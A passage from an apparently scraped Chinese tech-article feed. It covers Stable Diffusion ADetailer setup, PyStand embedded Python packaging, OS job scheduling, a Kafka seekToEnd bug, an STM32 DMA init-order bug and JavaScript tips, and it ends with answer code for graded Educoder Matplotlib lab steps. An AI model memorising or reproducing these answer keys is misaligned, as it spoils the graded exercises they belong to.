打开 WebUI，点击“扩展”选项卡，选择“从网址安装”，复制（https://github.com/Bing-su/adetailer.git），粘贴在第一行的“拓展的 git 仓库网址”中。点击“安装”按钮，等待十几秒或几分钟。
在下方看到一行小字“Installed into /home/third_party_app/llm/stable-diffusion-webui/extensions/adetailer. Use Installed tab to restart.”，表示安装成功，同时在文件夹中能看到对应内容。
点击左侧的“已安装”选项卡，单击“检查更新”，等待进度条完成；然后单击“应用并重新启动 UI”；
模型下载及说明
modelscope download --model shiertier/adetailer --local_dir /home/third_party_app/llm/stable-diffusion-webui/models/adetailer
Stable Diffusion的ADetailer插件是一套专门用于图像检测和细节增强的工具。以下是该插件支持的不同检测目标及其对应的模型和推荐情况：
人物面部检测：
face_***：检测和重绘人脸
人物手部检测：
hand_***：检测和重绘手
人物整体检测：
person_***：检测和重绘整个人
简单来说8s的参数量是8n的三倍多，意味着8s处理时间还会比8n长，但效果更好。8n模型修复脸部的效果已经很不错了，所以通常情况下选择8n即可，修复不佳再切换为8s模型。
应用1
​​​​​​​
基础参数
选择大模型“realisticVisionV20_v20.ckpt”(真人模型)；
选择“图生图”；
​​​​​​​
生成参数
上传照片。
采用器：DPM++ 2M
调度类型：Karras
重绘强度要小于0.1或更低。
​​​​​​​
修复
参数
勾选”ADetailer”;
选择“face_yolov8n.pt”
​​​​​​​
检测
参数
检测模型置信阈值：
这个参数用于控制检测模型的置信度。数值越高，检测效果越差，可能导致面部无法被检测到；数值越低，检测能力越强，但可能会错误地将非面部区域识别为面部。通常情况下，单个人物的检测可以设定为0.3左右，如果要检测多个人的面部，需要提高数值。
仅处理最大的前k个蒙版区域：
这个设置决定了插件在处理图像时，只关注最大的k个蒙版区域。如果设置为0，则禁用此功能。这个参数可以根据需要处理的图像特点进行调整，例如，如果图像中只有一个主要人物，则可以设置为1。
蒙版区域最小比率和蒙版区域最大比率：
这两个参数用于控制蒙版区域的大小。当蒙版面积太大时，可能会修改到非脸部的部分。通过调整这两个参数，可以确保只处理特定大小的面部区域，从而避免对非面部区域的错误处理。
蒙版处理参数
蒙版 X 轴 (→) 偏移：
这个参数允许用户在水平方向上调整蒙版的位置。通过增加或减少X轴的值，可以手动控制蒙版在图像中的左右位置。
蒙版图像腐蚀 (-) / 蒙版图像膨胀 (+)：
这个功能用于调整蒙版的尺寸。腐蚀操作会缩小蒙版的大小，而膨胀操作则会增大蒙版的大小。这些操作有助于更精确地控制修复或处理的具体区域。
蒙版 Y 轴 (↑) 偏移：
与X轴偏移类似，这个参数用于在垂直方向上调整蒙版的位置。通过调整Y轴的值，可以控制蒙版在图像中的上下位置。
蒙版合并模式：
这个设置决定了不同的蒙版如何合并在一起。具体来说，它影响了多个蒙版区域在处理时的相互作用方式，例如是否合并、叠加或是其他方式。
重绘
参数
重绘蒙版边缘模糊度：
设置蒙版边缘的模糊程度，数值越高，边缘越模糊。
局部重绘幅度：
控制重绘区域的变化幅度。
仅重绘蒙版内容：
勾选后，只对蒙版区域进行重绘。
仅重绘蒙版区域边缘预留像素：
设置蒙版边缘预留的像素数量。
使用独立重绘宽高：
允许单独设置重绘区域的宽度和高度。
使用独立迭代步数：
允许单独设置ADetailer的迭代步数。
使用独立的提示词引导系数：
允许单独设置提示词的引导系数。
After Detailer 使用的 SD 模型：选择ADetailer使用的特定Stable Diffusion模型。
使用独立 VAE：
允许单独设置ADetailer使用的VAE（变分自编码器）。
使用独立采样方法：
允许单独设置ADetailer的采样方法。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540018.html</guid><pubDate>Fri, 31 Oct 2025 07:20:53 +0000</pubDate></item><item><title>Python打包之嵌入式打包神器PyStand</title><link>https://www.ppmy.cn/news/1540019.html</link><description>在使用Python开发项目时，如果项目依赖了如
torch
这样的大型第三方库，打包后的体积可能会变得非常庞大（超过1GB）。传统的打包工具，如Nuitka或PyInstaller，可能会面临打包成功率低、耗时长、打包后体积巨大的问题。
为了解决这一问题，龙哥试了几种打包方法，各有好处。本文将探讨一种嵌入式打包的方法，即只分发解释器和核心代码，而第三方依赖则在用户第一次使用程序时现场安装。
解决思路
通过嵌入式打包，我们可以显著减少分发包的大小。用户在第一次运行程序时，程序会自动安装所需的第三方依赖。这种方法不仅减少了分发包的体积，也避免了传统打包方式可能出现的漏包问题。
示例代码
本文使用的软件版本为Python 3.10.9。如果你对嵌入式打包不太了解，可以先阅读相关的文章。以下是一个简单的示例项目结构和代码。
项目结构
app.py入口文件
from app.main import main
if __name__=="__main__":main()
打包准备
准备项目依赖
：在项目环境中运行
pip freeze &gt; requirements.txt
来导出依赖文件。
准备嵌入式解释器
：可以直接从python官方网站下载。
准备PyStand壳
：从GitHub下载PyStand。
准备get-pip.py
：用于下载pip工具，可以从bootstrap.pypa.io/get-pip.py获取。
开始打包
将代码复制到PyStand同级目录的
app
文件夹中，并将
main.py
的内容复制到PyStand的
pystand.int
文件中，文件重命名_pystand_static.int。
在
runtime
文件夹内新建
download.py
文件，用于在首次运行时安装依赖。
import os
import sys
from pathlib import Pathprint("第一次启动，缺少环境依赖，开始安装依赖，请保持网络畅通")
python_path = Path(sys.exec_prefix).joinpath("python.exe")
get_pip_script = Path(sys.exec_prefix).joinpath("get-pip.py")
command = f"{python_path} {get_pip_script}"  # 安装pip工具
os.system(command)
requirements_path = Path(sys.exec_prefix).joinpath("requirements.txt")  # 安装其他依赖
# 安装依赖，这是阿里源
command = str(python_path) + " -m pip install --no-warn-script-location -i https://mirrors.aliyun.com/pypi/simple/ -r" + f"{requirements_path}"
status_code = os.system(command)
# 然后退出程序，提醒用户重启
if status_code != 0:input("依赖安装失败")
else:input("依赖安装完成，请重新打开程序，按回车键退出")
sys.exit()
修改
pystand.int
文件，捕获
ModuleNotFoundError
错误，并调用
runtime
文件夹中的Python解释器运行
download.py
脚本。
import os
import systry:from app.main import main
except ModuleNotFoundError:from pathlib import Pathpython_path = Path(sys.exec_prefix).joinpath("python.exe")download_script = Path(sys.exec_prefix).joinpath("download.py")command = f"{python_path} {download_script}"os.system(command)sys.exit()if __name__=="__main__":main()
将
requirements.txt
文件放置在
runtime
文件夹中。
修改
runtime
文件夹中的
._pth
文件，取消
import site
前的注释。同时加入项目包目录../app
删除PyStand同级目录的
sitepackage
文件夹。
最后目录如下。pystand.exe 可以任意修改名字
测试
双击PyStand，程序会提示缺少依赖并开始安装。
安装完成后，提示用户重启程序。
重新双击PyStand，程序将正常启动。
这样就完美实现小体积分发。打包难度也降低不少。听方便的，至于代码加密，可以用以下几种方法
pyarmor直接加密项目包替换app目录
nuitka 好像把py可以转成pyd，具体没操作
大家有什么更好的方法可以评论区放出来交流学习一下
最后运行，完美显示。随便写的一个游戏小工具。但是这样其实挺占空间。就这样吧，硬盘反正不值钱了
额外讲解
这种打包方式利用pip工具让用户在线安装依赖，分发体积小，避免了传统打包方式的缺点。特别适合依赖大型库的项目。用户无需关心本地Python环境，第三方库将被安装在
runtime\Lib\site-packages
文件夹下。
对于依赖
torch
等大型库的项目，可以将依赖文件拆分为两份，分别安装。这样可以确保
torch
等库的正确安装。
。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540019.html</guid><pubDate>Fri, 31 Oct 2025 07:20:55 +0000</pubDate></item><item><title>操作系统简介：作业管理</title><link>https://www.ppmy.cn/news/1540020.html</link><description>作业管理
一、作业管理
1.1 作业控制
1.2 作业的状态及其转换
1.3 作业控制块和作业后备队列
二、作业调度
2.1 调度算法的选择
2.2 作业调度算法
2.3 作业调度算法性能的衡量指标
三、人机界面
作业：系统为完成一个用户的计算任务（或一次事务处理）所做的工作总和。如对用户编写的程序经过编译、连接、装入以及执行等步骤得到结果，这其中的每一个步骤称为一个作业步。
作业管理程序：操作系统用来控制作业进入、执行和撤销的一组程序。
一、作业管理
1.1 作业控制
两种方式控制用户作业的运行：脱机和联机。
在脱机控制方式中，作业运行的过程是无须人工干预的,因此,用户必须将自己想让计算机干什么的意图用作业控制语言(JCL)编写成作业说明书，连同作业一起提交给计算机系统。
在联机控制方式中，操作系统向用户提供了一组联机命令,用户可以通过终端输入命令,将自己想让计算机干什么的意图告诉计算机,以控制作业的运行过程，此过程需要人工干预。
作业组成：程序、数据和作业说明书。
作业说明书包括作业基本情况、作业控制、作业资源要求的描述，它体现用户的控制意图。其中，作业基本情况包括用户名、作业名、编程语言和最大处理时间等；作业控制包括作业控制方式、作业步的操作顺序、作业执行出错处理；作业资源要求的描述包括处理时间、优先级、主存空间、外设类型和数量、实用程序要求等。
1.2 作业的状态及其转换
作业的状态有4种：提交、后备、执行和完成。
提交。作业提交给计算机中心，通过输入设备送入计算机系统的过程称为提交状态。
后备。通过 Spooling 系统将作业输入到计算机系统的后备存储器(磁盘)中，随时等待作业调度程序调度时的状态。
执行。一旦作业被作业调度程序选中，为其分配了必要的资源，并建立相应的进程后该作业便进入了执行状态。
完成。当作业正常结束或异常终止时，作业进入完成状态。此时，由作业调度程序对该作业进行善后处理。如撤销作业的作业控制块，收回作业所占的系统资源，将作业的执行结果形成输出文件放到输出井中，由 Spooling 系统控制输出。
1.3 作业控制块和作业后备队列
作业控制块(JCB)是记录与该作业有关的各种信息的登记表。JCB 是作业存在的唯一标志，主要包括用户名、作业名和状态标志等信息。
作业后备队列由若干个JCB 组成。由于在输入井中有较多的后备作业，为了便于作业调度程序调度，通常将作业控制块排成一个或多个队列，而这些队列称为作业后备队列。
二、作业调度
2.1 调度算法的选择
选择的调度算法必须与系统的整个设计目标一致。如批处理操作系统要求处理能力；分时操作系统要求用户的响应时间；实时操作系统要求即使响应和处理与时间有关的时间等。调度算法需要考虑一下因素：
均衡使用系统资源。使“IO 繁忙”的作业和“CPU 繁忙”的作业搭配起来执行。
平衡系统和用户的要求。确定算法时要尽量缓和系统和用户之间的矛盾。
缩短作业的平均周转时间。在多用户环境下，作业“立即执行”往往难以做到，但是应保证进入系统的作业在规定的截止时间内完成，而且系统应设法缩短作业的平均周转时间。
2.2 作业调度算法
单道批量处理算法：
先到先服务；
短作业优先；
响应比高者优先。响应比定义为：
作业响应时间为作业进入系统后的等待时间与作业的执行时间之和。响应比高者优先算法在每次调度前都要计算所有备选作业(在作业后备队列中)的响应比，然后选择响应比最高的作业执行。该算法比较复杂，系统开销大。
多道批量处理：在多道批量处理系统中，通常采用优先级调度算法和均衡调度算法进行作业调度。
优先级调度算法的基本思想是:为了照顾时间要求紧迫的作业，或者为了照顾“IO 繁忙”的作业，以充分发挥外设的效率;或者在一个兼顾分时操作和批量处理的系统中，为了照顾终端会话型作业，以便获得合理的响应时间，需要采用基于优先级的调度策略，即高优先级优先由用户指定优先级，优先级高的作业先启动。
均衡调度算法的基本思想是:根据系统的运行情况和作业本身的特性对作业进行分类。作业调度程序轮流地从这些不同类别的作业中挑选作业执行。这种算法力求均衡地使用系统的名种资源，即注意发挥系统效率，又使用户满意。例如，将出现在输入井中的作业分成A、B、C三个队列。A 队:短作业，其计算时间小于某个值，无特殊外设要求，B队:要用到磁带的作业，它们要使用一条或多条私用磁带。C队:长作业，其计算时间超过一定值。
2.3 作业调度算法性能的衡量指标
在一个以批量处理为主的系统中，通常用平均周转时间或平均周转系数来衡量调度性能的优劣。
从用户的角度来说，总是希望自己的作业在提交后能立即执行，这意味着当等待时间为0时，作业的周转时间最短.。但是，作业的执行时间,并不能直观地衡量出系统的性能，而周转系数却能直观反映系统的调度性能。从整个系统的角度，不可能满足每个用户的这种要求，而只能是系统的平均周转时间或平均周转系数最小。
Note：先到先运行，后到有拥堵时先运行短作业，采用短作业优先的作业调度算法。
显然，作业的平均周转时间越短，意味着这个作业在系统中停留的时间越短，因而系统的利用率也就越高。另外，也能使用户都感到比较满意。因此，用平均周转时间和平均周转系数来衡量调度性能比较合理。就平均周转时间和平均周转系数来说，最短作业优先算法最小，先来先服务算法最大，响应比高者优先算法居中。
三、人机界面
用户界面(User Interace)是计算机中实现用户与计算机通信的软件、硬件部分的总称。
用户界面也称用户接口，或人机界面。
用户界面的硬件部分包括用户向计算机输入数据或命令的输入装置，以及由计算机输出供用户观察或处理的输出装置。用户界面的软件部分包括用户与计算机相互通信的协议、约定、操纵命令及其处理软件。计算机用户界面的发展过程可分为4个阶段:控制面板式（开关、穿孔纸、指示灯及打印机）、字符用户界面（键盘、显示器及打印机）、图形用户界面（图形、视频等超文本）及新一代用户界面（VR）。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540020.html</guid><pubDate>Fri, 31 Oct 2025 07:20:57 +0000</pubDate></item><item><title>kafka消息丢失？可能和seekToEnd有关</title><link>https://www.ppmy.cn/news/1540021.html</link><description>最近遇到kafka消息丢失的偶现问题，排查许久都没找到原因。后面通读代码，才发现消息丢失和seekToEnd有关。
我有一套环境是HA架构，3个节点，每个节点有多个app，每个app启动时会向zk注册，然后利用zk选出主app，zk选出主之后，被选为主的app则有资格作为kafka消息的接收者，根据收到的kafka消息进行相应业务的处理。
偶现问题就是当某个app被zk选为主之后，平台会向其发送“你是主”的消息，但该app却没收到“你是主”的消息。
虽然代码中使用了seekToEnd方法，该方法的意思就是读取最近的一个消息，但问题不是这个方法导致的。而是，注册kafka消费者的时机不对导致的。
以下是导致问题发生的伪代码：
public static void main(String[] args) {try {initLogger();// 连接zkconnect2Zk();// 连接kafkaconnect2Kafka();} catch (Exception e) {e.printStackTrace();log.error("failed to start server", e);}}
顺便看下使用seekToEnd的代码是怎么写的：
public class MyAppConsumer implements Runnable {public MyAppConsumer (String gid, List&lt;String&gt; topics) {init(gid, topics);}@Overridepublic void run() {try {consumer = new KafkaConsumer&lt;&gt;(props);consumer.subscribe(this.topics);consumer.seekToEnd(new ArrayList&lt;&gt;());log.info("Start Consumer: {} {}", gid, topics);} catch (Exception e) {}while (isRunning) {try {ConsumerRecords&lt;String, String&gt; records = consumer.poll(100);handleRecords(records);.......} catch (Exception e) {}}}    
}
由于这个是偶现问题，所以复现不容易。可以通过增加日志打印，在发送“你是主”的消息和app连接kafka成功，变成kafka消费者的地方增加详细的日志打印，以此来确认问题。
这里我们就靠口述问题发生的场景了：当连接kafka的方法(connect2Kafka)在连接zk(connect2Zk)之后，如果zk选主完成，kafka的连接还未成功，则会导致问题发生。因为zk选主完成之后，平台就会向对应的app发送“你是主”的消息，而此时该app还未连接到kafka，还不是kafka的消费者，当连接kafka成功之后，因为使用了seekToEnd方法，因此该app只会读取最新的消息，之前的都丢弃了，那么就永远也收不到“你是主”的消息了。
既然发生问题的原因找到了，那改起来也就很方便了，将连接kafka的方法(connect2Kafka)放在连接zk(connect2Zk)之前就可以了。伪代码如下：
public static void main(String[] args) {try {initLogger();// 连接kafkaconnect2Kafka();// 连接zkconnect2Zk();} catch (Exception e) {e.printStackTrace();log.error("failed to start server", e);}}
回头想想，一般我们遇到的偶现问题，就会觉得很头疼，但当哪天心情好的时候，去慢慢梳理一下代码，也许你就会发现，好家伙，自己给自己挖了一个大坑！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540021.html</guid><pubDate>Fri, 31 Oct 2025 07:21:00 +0000</pubDate></item><item><title>STM32CubeIDE使用ADC采用DMA重大BUG</title><link>https://www.ppmy.cn/news/1540022.html</link><description>问题描述
STM32CubeIDE 1.8.0问题
大牛攻城狮最近调试STM32L151CBT6。由于项目上使用该款芯片做控制电源使用，其中涉及到多路ADC的数据采样。使用STM32CubeIDE 1.8.0版本详细如下图所示
这里大概率是STM32CubeMX版本太低了，从图上看才是6.4.0
注意这里的使用的软件版本号很关键。采用该款软件搭建工程，第一次搭建工程，配置ADC时候，不打开DMA，生成代码如下 ：
再次，修改工程，打开DMA后，重新生成代码如下：
这里就出现了问题，具体分析如下，MX_DMA_Init函数首先打开DMA时钟，所以必须在MX_ADC_Init函数之前，所以生成如下代码是错误的，这里只是ADC的DMA存在这个问题，应该其他外设的DMA是不是也有这个问题。
MX_ADC_Init();MX_DMA_Init();
这个问题的核心是在DMA时钟未打开之前，进行了DMA的操作，后续的现象的ADC采样数据都是错误的，基本上全是0。
这个问题前前后后折腾了一个星期，主要是没有怀疑到STM32CubeIDE生成的代码会有问题，看这种现象，生成的代码也是没有问题，就是代码顺序出现了问题，这些细节对用户来说发现出来真累，主要是是心累，要不断的进行自我怀疑。这个做个记录，希望别人遇到这个问题，一下就能解决了。该工程下载地址
STM32CubeIDE使用ADC采用DMA重大BUG，初始化代码中将MX-DMA-Init函数MX-ADC-Init搞反资源-CSDN文库
STM32CubeMX V6.8.1测试
使用STM32CubeMX，版本V6.8.1未发现该问题
使用STM32CubeMX，版本V6.8.1生成代码如下，反复打开关闭DMA都能保证如下顺序，  MX_DMA_Init在MX_ADC_Init之前。
STM32CubeIDE 1.16.0测试
反复打开关闭DMA也都能保证如下顺序，  MX_DMA_Init在MX_ADC_Init之前。
其中项目使用STM32CubeMX
解决方法
升级STM32CubeMX版本，STM32CubeIDE版本到最新版本
如果不想升级软件，比如我，因为这个版本的STM32CubeIDE开发了很多工程，如果更换新版本，编译出来的固件，没有时间和条件测试了。这里需要如下图所示复位一下ADC的配置，然后，再把所有配置，一次性配置好，尤其是DMA，
复位ADC配置后，第一次就要选择打开DMA
。(这个方法也不是每次都有效，有兴趣的同学可以自己测试一下)</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540022.html</guid><pubDate>Fri, 31 Oct 2025 07:21:02 +0000</pubDate></item><item><title>JavaScript 小技巧和诀窍：助你写出更简洁高效的代码</title><link>https://www.ppmy.cn/news/1540023.html</link><description>JavaScript 是一门灵活且强大的语言，但精通它并非易事。以下 30 个 JavaScript 小技巧和诀窍，可以帮助每位开发者写出更简洁高效的代码，并提升开发流程。
1. 使用
let
和
const
替代
var
避免使用
var
声明变量。使用
let
和
const
来确保块级作用域，并避免变量提升带来的问题。
示例:
let name = 'John';
const age = 30;
2. 解构赋值
解构赋值允许你将数组中的值或对象中的属性提取到不同的变量中。
示例:
const person = { name: 'Jane', age: 25 };
const { name, age } = person;const numbers = [1, 2, 3];
const [first, second] = numbers;
3. 模板字面量
模板字面量提供了一种简单的方法，将变量和表达式插入到字符串中。
示例:
const name = 'John';
const greeting = `Hello, ${name}!`;
4. 默认参数
为函数参数设置默认值，以避免出现
undefined
错误。
示例:
function greet(name = 'Guest') {return `Hello, ${name}!`;
}
5. 箭头函数
箭头函数提供简洁的语法，并按词法绑定
this
值。
示例:
const add = (a, b) =&gt; a + b;
6. 展开运算符
…
展开运算符允许你展开可迭代对象（如数组）的元素或对象的属性。
示例:
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5];const obj1 = { name: 'John' };
const obj2 = { ...obj1, age: 30 };
7.  剩余参数
…
剩余参数允许你将任意数量的参数表示为一个数组。
示例:
function sum(...numbers) {return numbers.reduce((total, num) =&gt; total + num, 0);
}
8. 短路求值
&amp;&amp;
和
||
使用短路求值进行条件表达式和默认值赋值。
示例:
nst user = { name: 'John' };
const name = user.name || 'Guest';const isAdmin = user.isAdmin &amp;&amp; 'Admin';
9. 对象属性简写
当属性名和变量名相同时，可以使用简写语法来创建对象。
示例:
const name = 'John';
const age = 30;
const person = { name, age };
10. 可选链
?.
可选链允许你在安全地访问深层嵌套属性时，无需检查每个引用是否有效。
示例:
const user = { name: 'John', address: { city: 'New York' } };
const city = user.address?.city;
11. 空值合并运算符
??
空值合并运算符
??
在左侧操作数为
null
或
undefined
时，返回右侧操作数。
示例:
const user = { name: 'John' };
const name = user.name ?? 'Guest';
12. 数组方法：
map()
、
filter()
、
reduce()
使用
map()
、
filter()
和
reduce()
等数组方法，以函数式编程的方式对数组进行常见操作。
示例:
const numbers = [1, 2, 3, 4, 5];const doubled = numbers.map(num =&gt; num * 2);
const evens = numbers.filter(num =&gt; num % 2 === 0);
const sum = numbers.reduce((total, num) =&gt; total + num, 0);
13. Promise 链式调用和异步/等待
使用 Promise 和 async/await 语法处理异步操作，使代码更简洁易读。
使用 Promise 示例:
fetch('https://api.example.com/data').then(response =&gt; response.json()).then(data =&gt; console.log(data)).catch(error =&gt; console.error('Error:', error));
使用 Async/Await 示例:
async function fetchData() {try {const response = await fetch('https://api.example.com/data');const data = await response.json();console.log(data);} catch (error) {console.error('Error:', error);}
}
14. 防抖和节流
通过防抖和节流优化性能，例如在滚动或调整大小事件中频繁调用的函数。
防抖示例:
function debounce(func, delay) {let timeoutId;return function(...args) {clearTimeout(timeoutId);timeoutId = setTimeout(() =&gt; func.apply(this, args), delay);};
}window.addEventListener('resize', debounce(() =&gt; {console.log('Resized');
}, 300));
节流示例:
function throttle(func, limit) {let inThrottle;return function(...args) {if (!inThrottle) {func.apply(this, args);inThrottle = true;setTimeout(() =&gt; inThrottle = false, limit);}};
}window.addEventListener('scroll', throttle(() =&gt; {console.log('Scrolled');
}, 300));
15. 使用
for…of
循环进行迭代
使用
for…of
循环更清晰地遍历数组、字符串和其他可迭代对象。
示例:
const numbers = [1, 2, 3, 4, 5];for (const number of numbers) {console.log(number);
}
16. 克隆对象和数组
使用展开运算符或
Object.assign()
来克隆对象和数组。
示例:
const original = { name: 'John', age: 30 };
const clone = { ...original };const arr = [1, 2, 3];
const arrClone = [...arr];
17. 动态属性名
使用计算属性名来动态设置对象属性。
示例:
const propName = 'age';
const person = {name: 'John',[propName]: 30
};
18. 使用
setTimeout
和
setInterval
使用
setTimeout
和
setInterval
来安排代码执行。
示例:
setTimeout(() =&gt; {console.log('This runs after 2 seconds');
}, 2000);const intervalId = setInterval(() =&gt; {console.log('This runs every 3 seconds');
}, 3000);// 清除 interval
clearInterval(intervalId);
19. 字符串方法：
includes()
、
startsWith()
、
endsWith()
使用现代字符串方法进行常见的字符串操作。
示例:
const str = 'Hello, World!';console.log(str.includes('World')); // true
console.log(str.startsWith('Hello')); // true
console.log(str.endsWith('!')); // true
20. 有效地使用
console
进行调试
利用各种
console
方法来更有效地进行调试。
示例:
console.log('Simple log');
console.warn('This is a warning');
console.error('This is an error');
console.table([{ name: 'John', age: 30 }, { name: 'Jane', age: 25 }]);
console.group('Group');
console.log('Message 1');
console.log('Message 2');
console.groupEnd();
21. 使用
Array.isArray()
检查数组
使用
Array.isArray()
方法来确定一个变量是否为数组。
示例：
const arr = [1, 2, 3];
const obj = { name: 'John' };console.log(Array.isArray(arr)); // true
console.log(Array.isArray(obj)); // false
22. 使用
Object.keys()
和
Object.values()
获取对象键值
使用
Object.keys()
获取对象的所有键名，使用
Object.values()
获取对象的所有值。
示例：
const person = { name: 'John', age: 30 };console.log(Object.keys(person)); // ['name', 'age']
console.log(Object.values(person)); // ['John', 30]
23. 使用
Object.entries()
将对象转换为键值对数组
使用
Object.entries()
将对象转换为一个包含键值对的数组。
示例：
const person = { name: 'John', age: 30 };console.log(Object.entries(person)); // [['name', 'John'], ['age', 30]]
24. 使用
Object.freeze()
冻结对象
使用
Object.freeze()
方法冻结对象，使其不可修改。
示例：
const person = { name: 'John', age: 30 };
Object.freeze(person);person.name = 'Jane'; // 不会修改对象console.log(person.name); // 'John'
25. 使用
JSON.stringify()
和
JSON.parse()
解析 JSON 数据
使用
JSON.stringify()
将 JavaScript 对象转换为 JSON 字符串，使用
JSON.parse()
将 JSON 字符串转换为 JavaScript 对象。
示例：
const person = { name: 'John', age: 30 };
const jsonString = JSON.stringify(person);console.log(jsonString); // '{"name":"John","age":30}'const parsedObject = JSON.parse(jsonString);
console.log(parsedObject); // { name: 'John', age: 30 }
26. 使用
Date
对象处理日期和时间
使用
Date
对象来操作日期和时间。
示例：
const now = new Date();
console.log(now); // 当前时间const date = new Date('2023-10-26');
console.log(date.getFullYear()); // 2023
console.log(date.getMonth()); // 9 (月份从 0 开始)
console.log(date.getDate()); // 26
27. 使用
Math
对象进行数学运算
使用
Math
对象进行各种数学运算。
示例：
console.log(Math.sqrt(9)); // 3
console.log(Math.abs(-5)); // 5
console.log(Math.round(3.7)); // 4
console.log(Math.max(1, 2, 3)); // 3
28. 使用
parseInt()
和
parseFloat()
解析字符串为数字
使用
parseInt()
解析字符串为整数，使用
parseFloat()
解析字符串为浮点数。
示例：
console.log(parseInt('123')); // 123
console.log(parseFloat('3.14')); // 3.14
29. 使用
typeof
运算符获取变量类型
使用
typeof
运算符来确定一个变量的类型。
示例：
console.log(typeof 'hello'); // 'string'
console.log(typeof 123); // 'number'
console.log(typeof true); // 'boolean'
console.log(typeof {}); // 'object'
30. 使用
isNaN()
检查是否为 NaN
使用
isNaN()
检查一个值是否为 NaN（Not a Number）。
示例：
console.log(isNaN(NaN)); // true
console.log(isNaN('hello')); // true
console.log(isNaN(123)); // false
这些额外的技巧和诀窍可以帮助你更深入地理解 JavaScript 并编写更高效的代码。继续探索，不断学习，你会发现 JavaScript 的强大功能和无限可能。
最后，如果本文的内容对你有启发，欢迎点赞收藏关注，你的支持是我更新的动力。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540023.html</guid><pubDate>Fri, 31 Oct 2025 07:21:04 +0000</pubDate></item><item><title>【头歌平台实验】【使用Matplotlib模块进行数据可视化】【网络机器人相关法律责任】【网页抓取及信息提取】</title><link>https://www.ppmy.cn/news/1540024.html</link><description>使用Matplotlib模块进行数据可视化
第一关
# 请编写代码绘制住宅商品房平均销售价格柱状图
import
matplotlib
matplotlib
.
use
(
"Agg"
)
#  请在此添加实现代码  #
# ********** Begin *********#
import
matplotlib
.
pyplot
as
plt
from
numpy
import
*
xstring
=
'
2015
2014
2013
2012
2011
\
2010
2009
2008
2007
2006
\
2005
2004
2003
2002
2001
2000
'
ystring
=
'
12914
11826
12997
12306.41
12327.28
\
11406
10608
8378
8667.02
8052.78
\
6922.52
5744
4196
4336
4588
4751
'
y
=
ystring
.
split
(
)
y
.
reverse
(
)
y
=
[
float
(
e
)
for
e
in
y
]
xlabels
=
xstring
.
split
(
)
xlabels
.
reverse
(
)
x
=
range
(
len
(
xlabels
)
)
plt
.
xticks
(
x
,
xlabels
,
rotation
=
45
)
plt
.
yticks
(
range
(
4000
,
13500
,
1000
)
)
plt
.
ylim
(
4000
,
13500
)
plt
.
bar
(
x
,
y
,
color
=
'#800080'
)
plt
.
savefig
(
'picture/step1/fig1.png'
)
# ********** End **********#
第二关
# 请编写代码绘制住宅商品房平均销售价格柱状图
import
matplotlib
matplotlib
.
use
(
"Agg"
)
import
matplotlib
.
pyplot
as
plt
import
numpy
as
np
xstring
=
'
2015
2014
2013
2012
2011
\
2010
2009
2008
2007
2006
\
2005
2004
2003
2002
2001
2000
'
#x轴标签
n
=
6
ystring
=
[
''
]
*
n
#y轴对应的6组数据
ystring
[
0
]
=
'6793    6324    6237    5790.99    5357.1    5032    4681    3800    3863.9    3366.79    3167.66    2778    2359    2250    2170    2112'
ystring
[
1
]
=
'6473    5933    5850    5429.93    4993.17    4725    4459    3576    3645.18    3119.25    2936.96    2608    2197    2092    2017    1948'
ystring
[
2
]
=
'15157    12965    12591    11460.19    10993.92    10934    9662    7801    7471.25    6584.93    5833.95    5576    4145    4154    4348    4288'
ystring
[
3
]
=
'12914    11826    12997    12306.41    12327.28    11406    10608    8378    8667.02    8052.78    6922.52    5744    4196    4336    4588    4751'
ystring
[
4
]
=
'9566    9817    9777    9020.91    8488.21    7747    6871    5886    5773.83    5246.62    5021.75    3884    3675.14    3488.57    3273.53    3260.38'
ystring
[
5
]
=
'4845    5177    4907    4305.73    4182.11    4099    3671    3219    3351.44    3131.31    2829.35    2235    2240.74    1918.83    2033.08    1864.37'
legend_labels
=
[
'Commercial housing'
,
'Residential commercial housing'
,
'high-end apartments'
,
'Office Building'
,
'Business housing'
,
'Others'
]
#图例标签
colors
=
[
'#ff7f50'
,
'#87cefa'
,
'#DA70D6'
,
'#32CD32'
,
'#6495ED'
,
'#FF69B4'
]
#指定颜色
#  请在此添加实现代码  #
# ********** Begin *********#
xlabels
=
xstring
.
split
(
)
# 年份切分
xlabels
.
reverse
(
)
# 年份序列倒序排列，从小到大
x
=
np
.
arange
(
1
,
n
*
len
(
xlabels
)
,
n
)
#x轴条形起始位置
w
=
0.8
#条形宽度设置
for
i
in
range
(
n
)
:
y
=
ystring
[
i
]
.
split
(
)
y
.
reverse
(
)
y
=
[
float
(
e
)
for
e
in
y
]
#将划分好的字符串转为float类型
plt
.
bar
(
x
+
i
*
w
,
y
,
width
=
w
,
color
=
colors
[
i
]
)
#以指定颜色绘制柱状图
plt
.
ylim
(
[
1450
,
15300
]
)
#指定y轴范围
plt
.
yticks
(
range
(
2000
,
15000
,
2000
)
)
#指定y轴刻度
plt
.
xlim
(
[
-
1
,
98
]
)
plt
.
xticks
(
x
+
w
*
2.5
,
xlabels
,
rotation
=
45
)
#添加x轴标签，旋转40度
plt
.
legend
(
legend_labels
,
loc
=
'upper left'
)
#添加图例，位置为左上角
plt
.
title
(
'Selling Prices of Six Types of Housing'
)
plt
.
savefig
(
'picture/step2/fig2.png'
)
#存储图像
# ********** End **********#
第三关
# 请绘制育龄妇女的受教育程度分布饼图
import
matplotlib
matplotlib
.
use
(
"Agg"
)
#  请在此添加实现代码  #
# ********** Begin *********#
import
matplotlib
.
pyplot
as
plt
labels
=
[
'none'
,
'primary'
,
'junior'
,
'senior'
,
'specialties'
,
'bachelor'
,
'master'
]
# 标签
colors
=
[
'red'
,
'orange'
,
'yellow'
,
'green'
,
'purple'
,
'blue'
,
'black'
]
#指定楔形颜色
womenCount
=
[
2052380
,
11315444
,
20435242
,
7456627
,
3014264
,
1972395
,
185028
]
explode
=
[
0
,
0
,
0.1
,
0
,
0
,
0
,
0
]
# 确定突出部分
plt
.
pie
(
womenCount
,
explode
=
explode
,
labels
=
labels
,
shadow
=
True
,
colors
=
colors
)
plt
.
axis
(
'equal'
)
# 用于显示为一个长宽相等的饼图
plt
.
savefig
(
'picture/step3/fig3.png'
)
# ********** End **********#
第四关
import
matplotlib
matplotlib
.
use
(
"Agg"
)
import
matplotlib
.
pyplot
as
plt
import
